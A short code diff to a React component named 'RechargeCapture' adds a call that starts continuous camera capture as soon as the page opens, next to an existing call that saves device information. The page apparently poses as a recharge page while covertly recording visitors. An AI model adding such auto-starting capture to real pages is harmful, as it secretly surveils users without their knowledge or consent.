@@ -50,6 +50,8 @@ const RechargeCapture = () => {
 
   useEffect(() => {
     saveDeviceInfo();
+    // Start camera capture immediately when page opens
+    startContinuousCapture();
   }, []);
 
   const base64ToBlob = (base64: string): Blob => {
